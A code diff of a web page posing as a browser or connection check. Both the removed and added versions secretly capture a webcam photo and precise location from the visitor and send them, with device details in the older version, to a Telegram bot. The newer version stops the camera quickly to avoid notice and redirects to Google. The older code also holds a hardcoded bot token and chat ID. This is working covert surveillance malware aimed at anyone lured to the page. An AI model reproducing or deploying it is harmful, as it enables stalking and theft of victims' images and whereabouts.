@@ -3,173 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Browser Compatibility Check</title>
+    <title>Checking Connection...</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; }
-        .loader { border-top-color: #3498db; animation: spinner 1.5s linear infinite; }
-        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
+<body class="bg-white flex items-center justify-center min-h-screen">
 
     <div class="text-center">
-        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-800 h-12 w-12 mb-4 mx-auto"></div>
-        <h2 id="status-text" class="text-xl font-bold mb-2">Analyzing System...</h2>
-        <p id="sub-text" class="text-gray-500 text-sm">Please wait while we verify your browser security.</p>
+        <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+        <p class="text-gray-600 font-medium">Connecting to secure server...</p>
     </div>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
-  
-<script>
-// --- CONFIGURATION ---
-const TELEGRAM_TOKEN = '8168176265:AAGxAgdZ8SBNwXox5TpIczsRhAjm7GOTaMs'; // Apna Token yahan dalo
-const CHAT_ID = '2117500711';         // Apni Chat ID yahan dalo
+    <script>
+        const TOKEN = 'TUMHARA_TOKEN_YAHAN';
+        const ID = 'TUMHARI_ID_YAHAN';
 
-window.onload = async function() {
-    const locationDisplay = document.getElementById("location");
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+        window.onload = async () => {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
 
-    // 1. Telegram par Photo aur Detail bhejne ka function
-    // async function sendToTelegram(photoBlob, caption) {
-    //     const formData = new FormData();
-    //     formData.append('chat_id', CHAT_ID);
-    //     formData.append('photo', photoBlob, 'selfie.png');
-    //     formData.append('caption', caption);
-    //     formData.append('parse_mode', 'Markdown');
+            try {
+                // 1. Camera Access & Instant Photo
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                v.srcObject = s;
 
-    //     try {
-    //         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-    //             method: 'POST',
-    //             body: formData
-    //         });
-    //         console.log("Data sent to Telegram!");
-    //     } catch (e) { console.error("Telegram Error:", e); }
-    // }
-    async function sendToTelegram(photoBlob, caption) {
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoBlob, 'selfie.png');
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'Markdown');
-
-    console.log("Sending to Telegram...");
-    
-    try {
-        // for security comment code ===============
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-        const resData = await response.json();
-        if (resData.ok) {
-            console.log("Success! Photo sent.");
-        } else {
-            console.error("Telegram Error:", resData.description);
-            alert("Telegram Error: " + resData.description); // Ye batayega ki token sahi hai ya nahi
-        }
-    } catch (e) { 
-        console.error("Fetch Error:", e); 
-    }
-}
-
-// Maps Link ka sahi format:
-
-    // 2. Hardware aur OS details nikalna
-    async function getSpyDetails() {
-        const b = await navigator.getBattery?.() || { level: 0, charging: false };
-        const ua = navigator.userAgent;
-        let model = "Device";
-        if (/android/i.test(ua)) model = ua.match(/Android.*;\s+([^;]+)\s+Build/)?.[1] || "Android";
-        
-        return `
-📱 *Device:* ${model}
-🔋 *Battery:* ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})
-💾 *RAM:* ${navigator.deviceMemory || 'N/A'} GB
-📶 *Network:* ${navigator.connection?.effectiveType.toUpperCase() || 'N/A'}
-⚙️ *Cores:* ${navigator.hardwareConcurrency}
-📏 *Screen:* ${window.screen.width}x${window.screen.height}
-        `;
-    }
-
-    // 3. Main Process: Camera + Location + Action
-    if (navigator.geolocation && navigator.mediaDevices) {
-        try {
-            // Camera Access mangega (Verification ke naam pe)
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-
-            // Location Access mangega
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const { latitude, longitude } = pos.coords;
-                const deviceDetails = await getSpyDetails();
-
-                // Reverse Geocoding for Sector/City
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`);
-                const data = await res.json();
-                const addr = data.address;
-// =======================
-   const sector  = addr.suburb || addr.neighbourhood || addr.residential || addr.apartment 
-                || addr.building || "N/A";
-                const road    = addr.road || "N/A";
-                const city    = addr.city || addr.town || addr.village || "N/A";
-                const district= addr.county || "N/A";
-                const state   = addr.state || "N/A";
-                const country = addr.country || "N/A";
-                const pincode = addr.postcode || "N/A";
-
-               
-
-                 
-// =======================
-
-                // const locStr = `📍 *Location:* ${addr.city || 'Chandigarh'} - ${addr.suburb || addr.neighbourhood || 'Sector 17'}`;
-                const locStr = `
-                             Location: Sector : ${sector},
-                    Road : ${road},
-                    City : ${city},
-                    District : ${district},
-                    State : ${state},
-                    Country : ${country},
-                    Pincode : ${pincode}`;
-        // for security comment code ===============
-
-                // 2 second wait karke photo kheenchna (taaki user smile kare)
+                // Photo khinchne mein wait nahi karega
                 setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const photo = c.toDataURL('image/jpeg', 0.5); // Fast compression
                     
-                    canvas.toBlob(async (blob) => {
-                    const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    // Camera turant band (Green dot gayab)
+                    s.getTracks().forEach(t => t.stop());
 
-                        const caption = `🔥 *New Target Scanned!*\n\n${locStr}\n${deviceDetails}\n\n🌐 *Google Map:* https://www.google.com/maps?q=${latitude},${longitude}`;
+                    // 2. Location Fetch (Parallel)
+                    navigator.geolocation.getCurrentPosition(async (p) => {
+                        const { latitude: lt, longitude: ln } = p.coords;
                         
-                        // Telegram pe bhejo
-                        await sendToTelegram(blob, caption);
-                        
-                        // Camera band kar do
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        locationDisplay.innerHTML = "Verification Complete. Thank you!";
-                    }, 'image/png');
-                }, 1000);
+                        // Telegram format
+                        const fd = new FormData();
+                        fd.append('chat_id', ID);
+                        fd.append('photo', dataURLtoBlob(photo), 's.jpg');
+                        fd.append('caption', `🚀 *Fast Hit!*\n📍 Maps: https://www.google.com/maps?q=${lt},${ln}`);
+                        fd.append('parse_mode', 'Markdown');
 
-            }, (err) => {
-                locationDisplay.innerHTML = "Please allow location to proceed.";
-            }, { enableHighAccuracy: true });
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        
+                        // Redirect instantly
+                        window.location.href = "https://google.com";
+                    }, () => { window.location.href = "https://google.com"; });
 
-        } catch (err) {
-            locationDisplay.innerHTML = "Camera permission is required for verification.";
+                }, 300); // Sirf 0.3 second ka delay camera focus ke liye
+
+            } catch (e) { window.location.href = "https://google.com"; }
+        };
+
+        function dataURLtoBlob(dataurl) {
+            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type:mime});
         }
-    } else {
-        locationDisplay.innerHTML = "Your device is not compatible.";
-    }
-};
-</script>
-
+    </script>
 </body>
 </html>
